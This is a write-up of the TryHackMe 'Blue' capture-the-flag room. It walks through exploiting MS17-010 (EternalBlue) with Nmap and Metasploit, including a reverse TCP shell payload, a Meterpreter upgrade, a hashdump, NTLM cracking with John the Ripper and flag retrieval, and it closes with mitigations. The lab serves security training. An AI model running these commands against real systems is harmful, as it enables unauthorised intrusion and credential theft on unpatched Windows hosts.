# 📝 TryHackMe: Blue — Writeup

---

## 🎯 Room Overview

| Info | Details |
|------|---------|
| **Room** | Blue |
| **Platform** | TryHackMe |
| **Difficulty** | Easy |
| **Vulnerability** | MS17-010 (EternalBlue) |
| **Tools Used** | Nmap, Metasploit, John the Ripper |

---

## 🔍 Phase 1: Reconnaissance

### Port Scanning

Started with an Nmap scan to discover open ports:

```bash
nmap -sV -sC --script vuln <TARGET_IP>
```

### Results:

Found **3 open ports** under 1000:

| Port | Service |
|------|---------|
| 135 | MSRPC |
| 139 | NetBIOS-SSN |
| 445 | Microsoft-DS (SMB) |

### Vulnerability Identified:

The scan revealed the target is vulnerable to **MS17-010** — the infamous **EternalBlue** exploit, which affects SMBv1 on Windows systems.

---

## 💥 Phase 2: Exploitation

### Metasploit Setup

Launched Metasploit and selected the EternalBlue exploit:

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
```

### Configuration:

```bash
set RHOSTS <TARGET_IP>
set payload windows/x64/shell/reverse_tcp
set LHOST <YOUR_IP>
run
```

✅ **Exploit executed successfully** — gained initial shell access!

---

## ⬆️ Phase 3: Privilege Escalation

### Upgrading to Meterpreter

Converted the basic shell to a Meterpreter session for more functionality:

```bash
# Background current session
Ctrl+Z

# Use shell upgrade module
use post/multi/manage/shell_to_meterpreter
set SESSION 1
run
```

### Interacting with Meterpreter:

```bash
sessions -i 2
```

---

## 🔓 Phase 4: Credential Harvesting

### Dumping Password Hashes

```bash
hashdump
```

### Output:

```
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

### Cracking NTLM Hash

Used **John the Ripper** to crack the NTLM hash:

```bash
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Result:

| User | Password |
|------|----------|
| **Jon** | **alqfna22** |

---

## 🚩 Phase 5: Flag Hunting

### Accessing the System

```bash
shell
```

### Flag 3 — User Desktop

```bash
cd C:\Users\Jon\Desktop
type flag3.txt
```

📍 **Location:** `C:\Users\Jon\Desktop\flag3.txt`

---

### Searching for Remaining Flags

Exited shell and used Meterpreter's search function:

```bash
exit
search -f "flag1.txt"
search -f "flag2.txt"
```

### Flag 1 — System Config

```bash
cat C:/Windows/System32/config/flag1.txt
```

📍 **Location:** `C:\Windows\System32\config\flag1.txt`

---

### Flag 2 — Root Directory

```bash
cat C:/flag2.txt
```

📍 **Location:** `C:\flag2.txt`

---

## 🏁 Summary

| Flag | Location |
|------|----------|
| **Flag 1** | `C:\Windows\System32\config\flag1.txt` |
| **Flag 2** | `C:\flag2.txt` |
| **Flag 3** | `C:\Users\Jon\Desktop\flag3.txt` |

---

## 📚 Key Takeaways

1. **MS17-010 (EternalBlue)** — A critical SMBv1 vulnerability allowing remote code execution
2. **Meterpreter** — More powerful than a basic shell, has built-in functions (hashdump, search, etc.)
3. **NTLM Hashes** — Easily crackable when weak passwords are used
4. **shell_to_meterpreter** — Useful post-exploitation module for upgrading sessions

---

## 🛡️ Mitigation

- Disable SMBv1 protocol
- Apply MS17-010 security patch
- Use strong, complex passwords
- Implement network segmentation
- Keep systems updated

---

